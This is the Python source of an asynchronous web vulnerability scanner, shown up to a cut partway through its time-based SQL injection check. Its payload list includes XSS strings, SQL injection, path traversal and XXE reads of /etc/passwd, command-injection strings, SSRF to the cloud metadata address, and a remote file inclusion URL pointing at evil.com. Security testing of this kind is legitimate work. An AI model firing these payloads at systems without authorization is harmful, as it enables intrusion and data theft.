#!/usr/bin/env python3
"""
🚀 COMMERCIAL-GRADE VULNERABILITY SCANNER
Professional real-time web application security scanner with advanced detection capabilities
"""

import asyncio
import aiohttp
import argparse
import json
import time
import logging
import ssl
import socket
import hashlib
import re
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Set, Tuple
from dataclasses import dataclass, asdict
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor
import threading
from collections import defaultdict, deque
import random
import base64
import hmac
import uuid

# Rich console for beautiful output
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich.tree import Tree

console = Console()

@dataclass
class VulnerabilityFinding:
    """Comprehensive vulnerability finding with detailed metadata"""
    id: str
    url: str
    vulnerability_type: str
    severity: str  # critical, high, medium, low
    confidence: str  # high, medium, low
    title: str
    description: str
    evidence: str
    impact: str
    remediation: str
    cvss_score: float
    cwe_id: Optional[str] = None
    references: List[str] = None
    payload: Optional[str] = None
    request_data: Optional[Dict] = None
    response_data: Optional[Dict] = None
    timestamp: datetime = None
    verified: bool = False
    false_positive: bool = False
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()
        if self.references is None:
            self.references = []

@dataclass
class ScanMetrics:
    """Comprehensive scan metrics for performance monitoring"""
    start_time: datetime
    end_time: Optional[datetime] = None
    total_requests: int = 0
    successful_requests: int = 0
    failed_requests: int = 0
    urls_discovered: int = 0
    vulnerabilities_found: int = 0
    false_positives: int = 0
    scan_coverage: float = 0.0
    average_response_time: float = 0.0
    rate_limit_hits: int = 0
    errors_encountered: int = 0

class AdvancedLogger:
    """Professional logging system with structured logging and multiple outputs"""
    
    def __init__(self, log_level: str = "INFO", log_file: str = None):
        self.log_level = getattr(logging, log_level.upper())
        self.log_file = log_file or f"commercial_scanner_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
        # Setup structured logging
        self.setup_logging()
        
        # Metrics tracking
        self.metrics = defaultdict(int)
        self.timing_data = deque(maxlen=1000)
        
    def setup_logging(self):
        """Setup comprehensive logging configuration"""
        # Create formatter
        formatter = logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(name)-20s | %(funcName)-15s | %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        
        # Root logger
        self.logger = logging.getLogger('CommercialScanner')
        self.logger.setLevel(self.log_level)
        
        # File handler
        file_handler = logging.FileHandler(self.log_file, encoding='utf-8')
        file_handler.setFormatter(formatter)
        file_handler.setLevel(logging.DEBUG)
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        console_handler.setLevel(logging.INFO)
        
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)
        
        # Separate security events logger
        self.security_logger = logging.getLogger('SecurityEvents')
        security_handler = logging.FileHandler(f"security_events_{datetime.now().strftime('%Y%m%d')}.log", encoding='utf-8')
        security_handler.setFormatter(logging.Formatter('%(asctime)s | SECURITY | %(message)s'))
        self.security_logger.addHandler(security_handler)
        self.security_logger.setLevel(logging.INFO)
    
    def log_vulnerability(self, finding: VulnerabilityFinding):
        """Log vulnerability finding with structured data"""
        vuln_data = {
            'id': finding.id,
            'type': finding.vulnerability_type,
            'severity': finding.severity,
            'url': finding.url,
            'cvss': finding.cvss_score,
            'verified': finding.verified
        }
        
        self.security_logger.info(f"VULNERABILITY_FOUND | {json.dumps(vuln_data)}")
        self.logger.warning(f"Vulnerability: {finding.vulnerability_type} | {finding.url} | Severity: {finding.severity}")
    
    def log_request(self, method: str, url: str, status_code: int, response_time: float):
        """Log HTTP request with performance metrics"""
        self.metrics['total_requests'] += 1
        self.timing_data.append(response_time)
        
        if 200 <= status_code < 400:
            self.metrics['successful_requests'] += 1
        else:
            self.metrics['failed_requests'] += 1
        
        self.logger.debug(f"HTTP {method} {url} | Status: {status_code} | Time: {response_time:.3f}s")
    
    def log_error(self, error: Exception, context: str = ""):
        """Log error with context and stack trace"""
        self.metrics['errors'] += 1
        self.logger.error(f"ERROR in {context}: {str(error)}", exc_info=True)
    
    def get_metrics(self) -> Dict:
        """Get comprehensive metrics"""
        avg_response_time = sum(self.timing_data) / len(self.timing_data) if self.timing_data else 0
        
        return {
            'total_requests': self.metrics['total_requests'],
            'successful_requests': self.metrics['successful_requests'],
            'failed_requests': self.metrics['failed_requests'],
            'success_rate': (self.metrics['successful_requests'] / max(1, self.metrics['total_requests'])) * 100,
            'average_response_time': avg_response_time,
            'errors': self.metrics['errors']
        }

class RateLimiter:
    """Advanced rate limiting with burst capacity and adaptive throttling"""
    
    def __init__(self, requests_per_second: float = 10, burst_capacity: int = 20):
        self.requests_per_second = requests_per_second
        self.burst_capacity = burst_capacity
        self.tokens = burst_capacity
        self.last_update = time.time()
        self.lock = asyncio.Lock()
        
        # Adaptive throttling
        self.consecutive_errors = 0
        self.base_rps = requests_per_second
        
    async def acquire(self) -> bool:
        """Acquire permission to make a request"""
        async with self.lock:
            now = time.time()
            elapsed = now - self.last_update
            
            # Add tokens based on elapsed time
            self.tokens = min(
                self.burst_capacity,
                self.tokens + elapsed * self.requests_per_second
            )
            self.last_update = now
            
            if self.tokens >= 1:
                self.tokens -= 1
                return True
            
            return False
    
    async def wait_if_needed(self):
        """Wait if rate limit is exceeded"""
        while not await self.acquire():
            await asyncio.sleep(0.1)
    
    def adapt_to_errors(self, error_occurred: bool):
        """Adapt rate limiting based on error patterns"""
        if error_occurred:
            self.consecutive_errors += 1
            if self.consecutive_errors > 5:
                # Reduce rate by 50% after consecutive errors
                self.requests_per_second = max(1, self.base_rps * 0.5)
        else:
            if self.consecutive_errors > 0:
                self.consecutive_errors = 0
                # Gradually restore original rate
                self.requests_per_second = min(self.base_rps, self.requests_per_second * 1.1)

class PayloadManager:
    """Advanced payload management with categorization and effectiveness tracking"""
    
    def __init__(self):
        self.payloads = self._load_comprehensive_payloads()
        self.effectiveness_scores = defaultdict(float)
        self.usage_stats = defaultdict(int)
    
    def _load_comprehensive_payloads(self) -> Dict[str, List[Dict]]:
        """Load comprehensive vulnerability payloads"""
        return {
            'xss': [
                {
                    'payload': '<script>alert("XSS")</script>',
                    'type': 'reflected',
                    'description': 'Basic script tag injection',
                    'detection_pattern': r'<script>alert\("XSS"\)</script>'
                },
                {
                    'payload': '<img src=x onerror=alert("XSS")>',
                    'type': 'reflected',
                    'description': 'Image tag with onerror event',
                    'detection_pattern': r'<img src=x onerror=alert\("XSS"\)>'
                },
                {
                    'payload': '"><script>alert("XSS")</script>',
                    'type': 'reflected',
                    'description': 'Attribute breaking XSS',
                    'detection_pattern': r'"><script>alert\("XSS"\)</script>'
                },
                {
                    'payload': 'javascript:alert("XSS")',
                    'type': 'reflected',
                    'description': 'JavaScript protocol injection',
                    'detection_pattern': r'javascript:alert\("XSS"\)'
                },
                {
                    'payload': '<svg onload=alert("XSS")>',
                    'type': 'reflected',
                    'description': 'SVG tag with onload event',
                    'detection_pattern': r'<svg onload=alert\("XSS"\)>'
                }
            ],
            'sqli': [
                {
                    'payload': "' OR '1'='1",
                    'type': 'boolean_blind',
                    'description': 'Boolean-based blind SQL injection',
                    'detection_pattern': r'(sql|mysql|oracle|postgresql|database).*error'
                },
                {
                    'payload': "' UNION SELECT 1,2,3,4,5--",
                    'type': 'union',
                    'description': 'Union-based SQL injection',
                    'detection_pattern': r'(sql|mysql|oracle|postgresql).*syntax'
                },
                {
                    'payload': "'; WAITFOR DELAY '00:00:05'--",
                    'type': 'time_blind',
                    'description': 'Time-based blind SQL injection',
                    'detection_pattern': None  # Time-based detection
                },
                {
                    'payload': "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    'type': 'boolean_blind',
                    'description': 'Information schema enumeration',
                    'detection_pattern': r'information_schema'
                }
            ],
            'lfi': [
                {
                    'payload': '../../../etc/passwd',
                    'type': 'path_traversal',
                    'description': 'Unix password file access',
                    'detection_pattern': r'root:.*:0:0:'
                },
                {
                    'payload': '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                    'type': 'path_traversal',
                    'description': 'Windows hosts file access',
                    'detection_pattern': r'localhost.*127\.0\.0\.1'
                },
                {
                    'payload': 'php://filter/convert.base64-encode/resource=index.php',
                    'type': 'php_filter',
                    'description': 'PHP filter wrapper',
                    'detection_pattern': r'PD9waHA='  # <?php in base64
                }
            ],
            'rfi': [
                {
                    'payload': 'http://evil.com/shell.txt',
                    'type': 'remote_include',
                    'description': 'Remote file inclusion',
                    'detection_pattern': r'failed to open stream'
                }
            ],
            'command_injection': [
                {
                    'payload': '; id',
                    'type': 'command_chaining',
                    'description': 'Command chaining with semicolon',
                    'detection_pattern': r'uid=\d+.*gid=\d+'
                },
                {
                    'payload': '| whoami',
                    'type': 'command_piping',
                    'description': 'Command piping',
                    'detection_pattern': r'(root|administrator|www-data)'
                },
                {
                    'payload': '`id`',
                    'type': 'command_substitution',
                    'description': 'Command substitution',
                    'detection_pattern': r'uid=\d+.*gid=\d+'
                }
            ],
            'xxe': [
                {
                    'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>''',
                    'type': 'file_disclosure',
                    'description': 'XXE file disclosure',
                    'detection_pattern': r'root:.*:0:0:'
                }
            ],
            'ssrf': [
                {
                    'payload': 'http://169.254.169.254/latest/meta-data/',
                    'type': 'aws_metadata',
                    'description': 'AWS metadata service access',
                    'detection_pattern': r'(ami-id|instance-id|security-groups)'
                },
                {
                    'payload': 'http://localhost:22',
                    'type': 'port_scan',
                    'description': 'Internal port scanning',
                    'detection_pattern': r'(SSH|OpenSSH)'
                }
            ]
        }
    
    def get_payloads(self, vuln_type: str, limit: int = 5) -> List[Dict]:
        """Get payloads for specific vulnerability type"""
        payloads = self.payloads.get(vuln_type, [])
        
        # Sort by effectiveness score
        sorted_payloads = sorted(
            payloads,
            key=lambda p: self.effectiveness_scores.get(f"{vuln_type}_{p['payload']}", 0),
            reverse=True
        )
        
        return sorted_payloads[:limit]
    
    def update_effectiveness(self, vuln_type: str, payload: str, successful: bool):
        """Update payload effectiveness based on results"""
        key = f"{vuln_type}_{payload}"
        self.usage_stats[key] += 1
        
        if successful:
            self.effectiveness_scores[key] += 1.0
        else:
            self.effectiveness_scores[key] = max(0, self.effectiveness_scores[key] - 0.1)

class CommercialVulnerabilityScanner:
    """Commercial-grade vulnerability scanner with advanced detection capabilities"""
    
    def __init__(self, target_url: str, config: Dict = None):
        self.target_url = target_url
        self.config = config or self._default_config()
        
        # Core components
        self.logger = AdvancedLogger(
            log_level=self.config.get('log_level', 'INFO'),
            log_file=self.config.get('log_file')
        )
        self.rate_limiter = RateLimiter(
            requests_per_second=self.config.get('requests_per_second', 10),
            burst_capacity=self.config.get('burst_capacity', 20)
        )
        self.payload_manager = PayloadManager()
        
        # Scan state
        self.findings: List[VulnerabilityFinding] = []
        self.discovered_urls: Set[str] = set()
        self.scanned_urls: Set[str] = set()
        self.metrics = ScanMetrics(start_time=datetime.now())
        
        # Session management
        self.session: Optional[aiohttp.ClientSession] = None
        self.session_cookies: Dict[str, str] = {}
        
        # Advanced features
        self.fingerprints: Dict[str, Any] = {}
        self.technology_stack: Set[str] = set()
        self.custom_headers = self.config.get('custom_headers', {})
        
        # Concurrent scanning
        self.semaphore = asyncio.Semaphore(self.config.get('max_concurrent_requests', 20))
        
    def _default_config(self) -> Dict:
        """Default configuration for commercial scanner"""
        return {
            'requests_per_second': 10,
            'burst_capacity': 20,
            'max_concurrent_requests': 20,
            'request_timeout': 30,
            'max_redirects': 5,
            'user_agent': 'CommercialVulnScanner/2.0',
            'verify_ssl': False,
            'log_level': 'INFO',
            'scan_depth': 3,
            'payload_limit': 5,
            'enable_advanced_detection': True,
            'custom_headers': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
        }
    
    async def initialize(self):
        """Initialize scanner components"""
        self.logger.logger.info("Initializing Commercial Vulnerability Scanner")
        
        # Create HTTP session with advanced configuration
        connector = aiohttp.TCPConnector(
            limit=self.config.get('max_concurrent_requests', 20),
            limit_per_host=10,
            ttl_dns_cache=300,
            use_dns_cache=True,
            ssl=False if not self.config.get('verify_ssl', False) else None
        )
        
        timeout = aiohttp.ClientTimeout(total=self.config.get('request_timeout', 30))
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=self.config.get('custom_headers', {}),
            cookie_jar=aiohttp.CookieJar()
        )
        
        self.logger.logger.info("Scanner initialized successfully")
    
    async def scan(self) -> Dict[str, Any]:
        """Main scanning workflow"""
        try:
            await self.initialize()
            
            self.logger.logger.info(f"Starting comprehensive scan of {self.target_url}")
            
            # Phase 1: Discovery and Reconnaissance
            await self._discovery_phase()
            
            # Phase 2: Vulnerability Detection
            await self._vulnerability_detection_phase()
            
            # Phase 3: Advanced Testing
            await self._advanced_testing_phase()
            
            # Phase 4: Verification and Reporting
            await self._verification_phase()
            
            # Generate final report
            report = await self._generate_comprehensive_report()
            
            self.logger.logger.info("Scan completed successfully")
            return report
            
        except Exception as e:
            self.logger.log_error(e, "main_scan")
            raise
        finally:
            await self.cleanup()
    
    async def _discovery_phase(self):
        """Phase 1: Advanced discovery and reconnaissance"""
        self.logger.logger.info("Phase 1: Discovery and Reconnaissance")
        
        # Initial target analysis
        await self._analyze_target()
        
        # Technology fingerprinting
        await self._fingerprint_technologies()
        
        # URL discovery
        await self._discover_urls()
        
        # Directory and file enumeration
        await self._enumerate_directories()
        
        self.logger.logger.info(f"Discovery completed: {len(self.discovered_urls)} URLs found")
    
    async def _analyze_target(self):
        """Analyze target for basic information"""
        try:
            async with self.semaphore:
                await self.rate_limiter.wait_if_needed()
                
                start_time = time.time()
                async with self.session.get(self.target_url) as response:
                    response_time = time.time() - start_time
                    content = await response.text()
                    
                    self.logger.log_request('GET', self.target_url, response.status, response_time)
                    
                    # Basic analysis
                    self.fingerprints['status_code'] = response.status
                    self.fingerprints['headers'] = dict(response.headers)
                    self.fingerprints['content_length'] = len(content)
                    self.fingerprints['response_time'] = response_time
                    
                    # Server fingerprinting
                    server_header = response.headers.get('Server', '')
                    if server_header:
                        self.technology_stack.add(server_header)
                    
                    # Framework detection
                    await self._detect_frameworks(content, response.headers)
                    
        except Exception as e:
            self.logger.log_error(e, "target_analysis")
    
    async def _detect_frameworks(self, content: str, headers: Dict):
        """Detect web frameworks and technologies"""
        # Header-based detection
        framework_headers = {
            'X-Powered-By': lambda x: self.technology_stack.add(x),
            'X-AspNet-Version': lambda x: self.technology_stack.add(f"ASP.NET {x}"),
            'X-Generator': lambda x: self.technology_stack.add(x)
        }
        
        for header, handler in framework_headers.items():
            if header in headers:
                handler(headers[header])
        
        # Content-based detection
        content_patterns = {
            r'wp-content|wp-includes': 'WordPress',
            r'drupal|sites/default': 'Drupal',
            r'joomla|/components/': 'Joomla',
            r'django|__admin_media__': 'Django',
            r'rails|/assets/': 'Ruby on Rails',
            r'laravel|/vendor/laravel': 'Laravel',
            r'symfony|/bundles/': 'Symfony',
            r'react|ReactDOM': 'React',
            r'angular|ng-app': 'Angular',
            r'vue\.js|Vue\.': 'Vue.js',
            r'jquery|jQuery': 'jQuery',
            r'bootstrap': 'Bootstrap'
        }
        
        for pattern, technology in content_patterns.items():
            if re.search(pattern, content, re.IGNORECASE):
                self.technology_stack.add(technology)
    
    async def _fingerprint_technologies(self):
        """Advanced technology fingerprinting"""
        self.logger.logger.info("Fingerprinting technologies...")
        
        # Common technology-specific paths
        tech_paths = [
            '/robots.txt',
            '/sitemap.xml',
            '/favicon.ico',
            '/.well-known/security.txt',
            '/wp-admin/',
            '/admin/',
            '/administrator/',
            '/phpmyadmin/',
            '/webmail/',
            '/.git/',
            '/.svn/',
            '/package.json',
            '/composer.json'
        ]
        
        tasks = []
        for path in tech_paths:
            url = urljoin(self.target_url, path)
            tasks.append(self._check_path_exists(url))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, result in enumerate(results):
            if isinstance(result, dict) and result.get('exists'):
                self.discovered_urls.add(urljoin(self.target_url, tech_paths[i]))
    
    async def _check_path_exists(self, url: str) -> Dict:
        """Check if a path exists and gather information"""
        try:
            async with self.semaphore:
                await self.rate_limiter.wait_if_needed()
                
                start_time = time.time()
                async with self.session.head(url, allow_redirects=False) as response:
                    response_time = time.time() - start_time
                    
                    self.logger.log_request('HEAD', url, response.status, response_time)
                    
                    exists = response.status < 400
                    return {
                        'url': url,
                        'exists': exists,
                        'status_code': response.status,
                        'headers': dict(response.headers),
                        'response_time': response_time
                    }
        except Exception as e:
            self.logger.log_error(e, f"path_check_{url}")
            return {'url': url, 'exists': False, 'error': str(e)}
    
    async def _discover_urls(self):
        """Advanced URL discovery"""
        self.logger.logger.info("Discovering URLs...")
        
        # Parse initial page for links
        await self._extract_links_from_page(self.target_url)
        
        # Discover URLs from common sources
        await self._discover_from_robots_txt()
        await self._discover_from_sitemap()
        
        # Recursive link discovery (limited depth)
        discovered_count = 0
        for url in list(self.discovered_urls):
            if discovered_count >= self.config.get('max_discovered_urls', 100):
                break
            
            if url not in self.scanned_urls:
                await self._extract_links_from_page(url)
                self.scanned_urls.add(url)
                discovered_count += 1
    
    async def _extract_links_from_page(self, url: str):
        """Extract links from a web page"""
        try:
            async with self.semaphore:
                await self.rate_limiter.wait_if_needed()
                
                start_time = time.time()
                async with self.session.get(url) as response:
                    response_time = time.time() - start_time
                    content = await response.text()
                    
                    self.logger.log_request('GET', url, response.status, response_time)
                    
                    # Extract links using regex
                    link_patterns = [
                        r'href=["\']([^"\']+)["\']',
                        r'src=["\']([^"\']+)["\']',
                        r'action=["\']([^"\']+)["\']'
                    ]
                    
                    for pattern in link_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            absolute_url = urljoin(url, match)
                            if self._is_valid_target_url(absolute_url):
                                self.discovered_urls.add(absolute_url)
                                
        except Exception as e:
            self.logger.log_error(e, f"link_extraction_{url}")
    
    async def _discover_from_robots_txt(self):
        """Discover URLs from robots.txt"""
        robots_url = urljoin(self.target_url, '/robots.txt')
        
        try:
            async with self.session.get(robots_url) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    # Extract disallowed paths
                    disallow_pattern = r'Disallow:\s*([^\s]+)'
                    matches = re.findall(disallow_pattern, content, re.IGNORECASE)
                    
                    for match in matches:
                        if match != '/':
                            url = urljoin(self.target_url, match)
                            self.discovered_urls.add(url)
                            
        except Exception as e:
            self.logger.log_error(e, "robots_txt_discovery")
    
    async def _discover_from_sitemap(self):
        """Discover URLs from sitemap.xml"""
        sitemap_urls = [
            urljoin(self.target_url, '/sitemap.xml'),
            urljoin(self.target_url, '/sitemap_index.xml'),
            urljoin(self.target_url, '/sitemaps.xml')
        ]
        
        for sitemap_url in sitemap_urls:
            try:
                async with self.session.get(sitemap_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Parse XML and extract URLs
                        try:
                            root = ET.fromstring(content)
                            
                            # Handle different sitemap formats
                            url_elements = root.findall('.//{http://www.sitemaps.org/schemas/sitemap/0.9}loc')
                            if not url_elements:
                                url_elements = root.findall('.//loc')
                            
                            for url_elem in url_elements:
                                if url_elem.text and self._is_valid_target_url(url_elem.text):
                                    self.discovered_urls.add(url_elem.text)
                                    
                        except ET.ParseError:
                            # Try regex extraction as fallback
                            url_pattern = r'<loc>([^<]+)</loc>'
                            matches = re.findall(url_pattern, content)
                            for match in matches:
                                if self._is_valid_target_url(match):
                                    self.discovered_urls.add(match)
                                    
            except Exception as e:
                self.logger.log_error(e, f"sitemap_discovery_{sitemap_url}")
    
    def _is_valid_target_url(self, url: str) -> bool:
        """Check if URL is a valid target for scanning"""
        try:
            parsed = urlparse(url)
            target_parsed = urlparse(self.target_url)
            
            # Same domain check
            if parsed.netloc != target_parsed.netloc:
                return False
            
            # Skip certain file types
            skip_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.css', '.js', '.pdf', '.zip'}
            if any(parsed.path.lower().endswith(ext) for ext in skip_extensions):
                return False
            
            return True
            
        except Exception:
            return False
    
    async def _enumerate_directories(self):
        """Enumerate common directories and files"""
        self.logger.logger.info("Enumerating directories and files...")
        
        # Common directories and files
        common_paths = [
            '/admin', '/administrator', '/wp-admin', '/phpmyadmin',
            '/backup', '/backups', '/old', '/test', '/dev',
            '/api', '/v1', '/v2', '/rest', '/graphql',
            '/config', '/configuration', '/settings',
            '/upload', '/uploads', '/files', '/documents',
            '/login', '/signin', '/auth', '/oauth',
            '/debug', '/trace', '/logs', '/log',
            '/status', '/health', '/info', '/version',
            '/readme.txt', '/changelog.txt', '/license.txt',
            '/.env', '/.config', '/.htaccess', '/web.config'
        ]
        
        tasks = []
        for path in common_paths:
            url = urljoin(self.target_url, path)
            tasks.append(self._check_path_exists(url))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, dict) and result.get('exists'):
                self.discovered_urls.add(result['url'])
    
    async def _vulnerability_detection_phase(self):
        """Phase 2: Comprehensive vulnerability detection"""
        self.logger.logger.info("Phase 2: Vulnerability Detection")
        
        # Test all discovered URLs
        tasks = []
        for url in list(self.discovered_urls)[:50]:  # Limit for performance
            tasks.extend([
                self._test_xss_vulnerabilities(url),
                self._test_sql_injection(url),
                self._test_lfi_vulnerabilities(url),
                self._test_command_injection(url),
                self._test_xxe_vulnerabilities(url),
                self._test_ssrf_vulnerabilities(url)
            ])
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        self.logger.logger.info(f"Vulnerability detection completed: {len(self.findings)} findings")
    
    async def _test_xss_vulnerabilities(self, url: str):
        """Comprehensive XSS testing"""
        payloads = self.payload_manager.get_payloads('xss', limit=self.config.get('payload_limit', 5))
        
        for payload_data in payloads:
            payload = payload_data['payload']
            
            try:
                # Test in URL parameters
                await self._test_xss_in_params(url, payload, payload_data)
                
                # Test in form inputs
                await self._test_xss_in_forms(url, payload, payload_data)
                
            except Exception as e:
                self.logger.log_error(e, f"xss_test_{url}")
    
    async def _test_xss_in_params(self, url: str, payload: str, payload_data: Dict):
        """Test XSS in URL parameters"""
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        
        for param_name in params:
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            try:
                async with self.semaphore:
                    await self.rate_limiter.wait_if_needed()
                    
                    start_time = time.time()
                    async with self.session.get(test_url) as response:
                        response_time = time.time() - start_time
                        content = await response.text()
                        
                        self.logger.log_request('GET', test_url, response.status, response_time)
                        
                        # Check if payload is reflected
                        if payload in content:
                            # Verify it's actually executable (not encoded)
                            if self._verify_xss_execution(content, payload, payload_data):
                                finding = self._create_xss_finding(
                                    url=test_url,
                                    payload=payload,
                                    payload_data=payload_data,
                                    parameter=param_name,
                                    evidence=content[:500]
                                )
                                self.findings.append(finding)
                                self.logger.log_vulnerability(finding)
                                
                                # Update payload effectiveness
                                self.payload_manager.update_effectiveness('xss', payload, True)
                            
            except Exception as e:
                self.logger.log_error(e, f"xss_param_test_{url}")
    
    def _verify_xss_execution(self, content: str, payload: str, payload_data: Dict) -> bool:
        """Verify if XSS payload would actually execute"""
        detection_pattern = payload_data.get('detection_pattern')
        if detection_pattern:
            return bool(re.search(detection_pattern, content, re.IGNORECASE))
        
        # Fallback: check if payload appears unencoded
        encoded_variants = [
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('"', '&quot;').replace("'", '&#x27;')
        ]
        
        return payload in content and not any(variant in content for variant in encoded_variants)
    
    def _create_xss_finding(self, url: str, payload: str, payload_data: Dict, parameter: str, evidence: str) -> VulnerabilityFinding:
        """Create XSS vulnerability finding"""
        return VulnerabilityFinding(
            id=str(uuid.uuid4()),
            url=url,
            vulnerability_type='Cross-Site Scripting (XSS)',
            severity='medium',
            confidence='high',
            title=f'Reflected XSS in parameter "{parameter}"',
            description=f'The parameter "{parameter}" is vulnerable to reflected Cross-Site Scripting (XSS). '
                       f'User input is reflected in the response without proper encoding or validation.',
            evidence=f'Payload: {payload}\nResponse excerpt: {evidence}',
            impact='An attacker could execute malicious JavaScript in the context of other users, '
                  'potentially stealing cookies, session tokens, or performing actions on behalf of the user.',
            remediation='Implement proper input validation and output encoding. Use Content Security Policy (CSP) headers.',
            cvss_score=6.1,
            cwe_id='CWE-79',
            references=[
                'https://owasp.org/www-community/attacks/xss/',
                'https://cwe.mitre.org/data/definitions/79.html'
            ],
            payload=payload,
            request_data={'url': url, 'parameter': parameter},
            response_data={'evidence': evidence}
        )
    
    async def _test_xss_in_forms(self, url: str, payload: str, payload_data: Dict):
        """Test XSS in form inputs"""
        try:
            # Get the page to find forms
            async with self.session.get(url) as response:
                content = await response.text()
                
                # Extract forms using regex (simplified)
                form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
                forms = re.findall(form_pattern, content, re.DOTALL | re.IGNORECASE)
                
                for action, form_content in forms:
                    # Extract input fields
                    input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
                    inputs = re.findall(input_pattern, form_content, re.IGNORECASE)
                    
                    if inputs:
                        await self._test_form_xss(url, action, inputs, payload, payload_data)
                        
        except Exception as e:
            self.logger.log_error(e, f"form_xss_test_{url}")
    
    async def _test_form_xss(self, base_url: str, action: str, inputs: List[str], payload: str, payload_data: Dict):
        """Test XSS in a specific form"""
        form_url = urljoin(base_url, action) if action else base_url
        
        # Prepare form data
        form_data = {}
        for input_name in inputs:
            form_data[input_name] = payload
        
        try:
            async with self.semaphore:
                await self.rate_limiter.wait_if_needed()
                
                start_time = time.time()
                async with self.session.post(form_url, data=form_data) as response:
                    response_time = time.time() - start_time
                    content = await response.text()
                    
                    self.logger.log_request('POST', form_url, response.status, response_time)
                    
                    # Check for XSS
                    if payload in content and self._verify_xss_execution(content, payload, payload_data):
                        finding = VulnerabilityFinding(
                            id=str(uuid.uuid4()),
                            url=form_url,
                            vulnerability_type='Cross-Site Scripting (XSS)',
                            severity='medium',
                            confidence='high',
                            title=f'XSS in form submission',
                            description=f'Form inputs are vulnerable to XSS attacks.',
                            evidence=f'Payload: {payload}\nForm data: {form_data}',
                            impact='XSS vulnerability in form allows script execution.',
                            remediation='Implement proper input validation and output encoding.',
                            cvss_score=6.1,
                            cwe_id='CWE-79',
                            payload=payload
                        )
                        self.findings.append(finding)
                        self.logger.log_vulnerability(finding)
                        
        except Exception as e:
            self.logger.log_error(e, f"form_xss_submit_{form_url}")
    
    async def _test_sql_injection(self, url: str):
        """Comprehensive SQL injection testing"""
        payloads = self.payload_manager.get_payloads('sqli', limit=self.config.get('payload_limit', 5))
        
        for payload_data in payloads:
            payload = payload_data['payload']
            
            try:
                if payload_data['type'] == 'time_blind':
                    await self._test_time_based_sqli(url, payload, payload_data)
                else:
                    await self._test_error_based_sqli(url, payload, payload_data)
                    
            except Exception as e:
                self.logger.log_error(e, f"sqli_test_{url}")
    
    async def _test_error_based_sqli(self, url: str, payload: str, payload_data: Dict):
        """Test error-based SQL injection"""
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        
        for param_name in params:
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            try:
                async with self.semaphore:
                    await self.rate_limiter.wait_if_needed()
                    
                    start_time = time.time()
                    async with self.session.get(test_url) as response:
                        response_time = time.time() - start_time
                        content = await response.text()
                        
                        self.logger.log_request('GET', test_url, response.status, response_time)
                        
                        # Check for SQL error patterns
                        if self._detect_sql_errors(content, payload_data):
                            finding = self._create_sqli_finding(
                                url=test_url,
                                payload=payload,
                                payload_data=payload_data,
                                parameter=param_name,
                                evidence=content[:500]
                            )
                            self.findings.append(finding)
                            self.logger.log_vulnerability(finding)
                            
                            self.payload_manager.update_effectiveness('sqli', payload, True)
                            
            except Exception as e:
                self.logger.log_error(e, f"sqli_error_test_{url}")
    
    async def _test_time_based_sqli(self, url: str, payload: str, payload_data: Dict):
        """Test time-based blind SQL injection"""
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        
        for param_name in params:
            # First, get baseline response time
            baseline_times = []
            for _ in range(3):
                try:
                    start_time = time.time()
                    async with self.session.get(url) as response:
                        baseline_times.append(time.time() - start_time)
                except:
                    continue
            
            if not baseline_times:
                continue
            
            avg_baseline = sum(baseline_times) / len(baseline_times)
            
            # Test with time-based payload
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            try:
                async with self.semaphore:
                    await self.rate_limiter.wait_if_needed()
                    
                    start_time = time.time()
                    async with self.session.get(test_url) as response:
                        response_time = time.time() - start_time
                        
                        self.logger.log_request('GET', test_url, response.status, response_time)
                        
                        # Check if response time is significantly longer
                        if response_time > avg_baseline + 4:  # 4+ second delay indicates time-based SQLi
                            finding = VulnerabilityFinding(
                                id=str(uuid.uuid4()),
                                url=test_url,
                                vulnerability_type='SQL Injection (Time-based Blind)',
                                severity='high',
                                confidence='high',
                                title=f'Time-based blind SQL injection in parameter "{param_name}"',
